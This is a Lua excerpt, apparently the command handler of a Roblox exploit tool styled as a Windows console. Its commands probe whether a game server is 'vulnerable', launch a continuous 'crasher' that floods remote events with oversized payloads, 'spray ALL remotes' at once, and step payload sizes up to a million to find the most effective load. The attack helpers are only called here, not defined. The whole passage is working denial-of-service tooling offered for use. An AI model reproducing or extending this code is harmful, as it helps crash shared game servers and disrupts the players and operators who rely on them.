-- ═══════════ COMMAND HANDLER ═══════════
local function processCommand(input)
    local cmd = string.lower(input)
    local args = string.split(cmd, " ")
    
    log("C:\\Users\\Admin> " .. input, Color3.fromRGB(255, 255, 255))
    
    if cmd == "!help" then
        log("Available Commands:", Color3.fromRGB(0, 255, 0))
        log("  !test           - Check if server is vulnerable (Safe)", Color3.fromRGB(0, 200, 255))
        log("  !crash          - Start continuous crash", Color3.fromRGB(200, 200, 200))
        log("  !spam           - Spray ALL remotes at once", Color3.fromRGB(255, 100, 255))
        log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
        log("  !limit          - Auto-test up to 1,000,000 safely", Color3.fromRGB(200, 200, 200))
        log("  !size <number>  - Set payload size", Color3.fromRGB(200, 200, 200))
        log("  !ping           - Check server ping", Color3.fromRGB(200, 200, 200))
        log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
        log("  !exit           - Close prompt", Color3.fromRGB(200, 200, 200))
        
    elseif cmd == "!test" then
        log("[*] Starting Safe Server Test...", Color3.fromRGB(0, 200, 255))
        task.spawn(function()
            local remote = resolve()
            if not remote then 
                log("[!] Remote not found. Server is completely patched.", Color3.fromRGB(255, 50, 50)) 
                return 
            end
            
            local wasRunning = state.running
            if wasRunning then stopCrash() end
            
            -- Test 200k using safe chunks
            local testSize = 200000
            local chunksNeeded = math.ceil(testSize / ChunkSize)
            log("[*] Firing " .. testSize .. " payload (Safe Chunking)...", Color3.fromRGB(200, 200, 200))
            
            local before = getPing()
            local p = buildChunk()
            
            for i = 1, chunksNeeded do
                pcall(function() remote:FireServer(p) end)
                task.wait(0.02) -- Safe yield
            end
            
            log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
            task.wait(3)
            
            local after = getPing()
            local spike = after - before
            
            log(string.format("[*] Baseline: %dms | After: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
            
            if spike > 100 or after > 400 then
                log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
                log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
            else
                log("[-] VERDICT: SERVER IS PATCHED OR TOO STRONG.", Color3.fromRGB(255, 50, 50))
            end
            
            if wasRunning then startCrash(false) end
        end)

    elseif cmd == "!spam" then
        if state.running then stopCrash() end
        log("[!!!] SPAM MODE ACTIVATED. Spraying ALL remotes...", Color3.fromRGB(255, 100, 255))
        startCrash(true)

    elseif cmd == "!crash" then
        if state.running then
            log("[!] Payload is already running!", Color3.fromRGB(255, 200, 50))
        else
            startCrash(false)
            log("[+] Crasher started. Firing continuously.", Color3.fromRGB(0, 255, 0))
        end
        
    elseif cmd == "!stop" then
        if not state.running then
            log("[!] Payload is not running.", Color3.fromRGB(255, 200, 50))
        else
            stopCrash()
            log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
        end
        
    elseif cmd == "!ping" then
        local p = getPing()
        log("[*] Current Server Ping: " .. p .. "ms", Color3.fromRGB(0, 200, 255))
        
    elseif cmd == "!limit" then
        log("[*] Starting Auto-Limit Test. Pushing up to 1,000,000 safely...", Color3.fromRGB(0, 200, 255))
        task.spawn(function()
            local remote = resolve()
            if not remote then return end
            
            local wasRunning = state.running
            if wasRunning then stopCrash() end
            
            local sizes = {100000, 200000, 300000, 500000, 750000, 1000000}
            local bestSize = 50000
            
            for _, sz in ipairs(sizes) do
                log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
                local chunks = math.ceil(sz / ChunkSize)
                local p = buildChunk()
                
                for i = 1, chunks do
                    pcall(function() remote:FireServer(p) end)
                    task.wait(0.02) -- Safe yield for big numbers
                end
                
                log("[*] Waiting 5s for server to process...", Color3.fromRGB(200, 200, 200))
                task.wait(5)
                bestSize = sz
            end
            
            TargetSize = bestSize
            state.chunkCache = nil
            
            log("[*] RECOMMENDED SAFE LIMIT: " .. bestSize, Color3.fromRGB(0, 200, 255))
            
            if wasRunning then startCrash(false) end
        end)
        
    elseif cmd == "!cls" then
        for _, v in ipairs(consoleFrame:GetChildren()) do
            if v:IsA("TextLabel") then v:Destroy() end
        end
        
    elseif cmd == "!exit" then
        screenGui:Destroy()
        
    elseif args[1] == "!size" then
        local num = tonumber(args[2])
        if num and num > 1000 then
            TargetSize = math.floor(num)
            state.chunkCache = nil
            log("[+] Target size set to " .. tostring(TargetSize), Color3.fromRGB(0, 255, 0))
        else
            log("[!] Invalid number. Example: !size 180000", Color3.fromRGB(255, 50, 50))
        end
        
    elseif cmd == "" then
        -- Do nothing
    else
        log("'" .. cmd .. "' is not recognized as an internal or external command,", Color3.fromRGB(255, 50, 50))
    end
end

